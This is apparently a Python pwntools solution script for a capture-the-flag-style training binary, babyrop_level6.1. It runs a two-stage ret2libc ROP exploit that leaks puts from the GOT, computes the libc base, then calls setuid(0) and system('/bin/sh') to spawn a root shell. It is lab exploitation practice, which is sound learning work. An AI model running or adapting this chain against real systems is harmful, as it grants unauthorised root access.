from pwn import *

context.log_level = 'debug'
context.binary = exe = ELF('/challenge/babyrop_level6.1', checksec=False)
libc = exe.libc

r = process(exe.path)
rop1 = ROP(exe)

#offset: 72

puts_got = exe.got['puts']
_start = exe.sym['_start']

#Rop gadget
rop1.raw('A'*72)
rop1.puts(puts_got)
rop1.raw(p64(_start))

log.info("The address of _start: " + hex(_start))
log.info("Dump ropchain: " + rop1.dump())
r.send(rop1.chain())
r.recvuntil(b'Leaving!\n')
#puts_got_addr = int.from_bytes(r.recvn(8), 'little')
puts_got_addr = u64(r.recvn(6) + b'\x00\x00')
log.info("The address of puts_got: " + hex(puts_got_addr))
libc.address = puts_got_addr - libc.sym['puts']

binsh = next(libc.search(b'/bin/sh\x00'))
log.info("The address of \"/bin/sh\": " + hex(binsh))
rop2 = ROP(libc)
rop2.raw('A'*72)
rop2.setuid(0)
rop2.system(binsh)
log.info("Dump ropchain: " + rop2.dump())
r.send(rop2.chain())
r.interactive()